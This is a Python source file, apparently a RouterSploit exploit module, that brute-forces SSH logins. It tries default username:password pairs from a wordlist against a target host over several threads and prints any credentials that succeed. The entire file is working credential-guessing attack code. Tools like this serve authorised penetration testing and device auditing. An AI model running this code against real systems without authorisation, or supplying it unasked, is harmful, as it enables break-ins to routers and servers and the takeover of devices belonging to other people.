import threading
import paramiko
import socket

from routersploit import *


class Exploit(exploits.Exploit):
    """
    Module perform dictionary attack with default credentials against SSH service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'SSH Default Creds',
        'author': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>' # routersploit module
         ]
    }

    target = exploits.Option('', 'Target IP address')
    port = exploits.Option(22, 'Target port')
    threads = exploits.Option(8, 'Numbers of threads')
    defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')

    credentials = []

    def run(self):
        self.credentials = []
        print_status("Running module...")
        ssh = paramiko.SSHClient()

        try:
            ssh.connect(self.target, port=self.port)
        except socket.error:
            print_error("Connection error: %s:%s" % (self.target, str(self.port)))
            ssh.close()
            return
        except:
            pass

        ssh.close()
        
        if self.defaults.startswith('file://'):
            defaults = open(self.defaults[7:], 'r')
        else:
            defaults = [self.defaults]
        
        collection = LockedIterator(defaults)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        name = threading.current_thread().name
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        print_status(name, 'process is starting...')

        while running.is_set():
            try:
                line = data.next().split(":")
                user = line[0].strip()
                password = line[1].strip()
                ssh.connect(self.target, int(self.port), timeout=5, username=user, password=password)
            except StopIteration:
                break
            except paramiko.ssh_exception.SSHException as err:
                ssh.close()
                print_error(name, err,"Username: '{}' Password: '{}'".format(user, password))
            else:
                running.clear()
                print_success("{}: Authentication succeed!".format(name), user, password)
                self.credentials.append((user, password))

        print_status(name, 'process is terminated.')
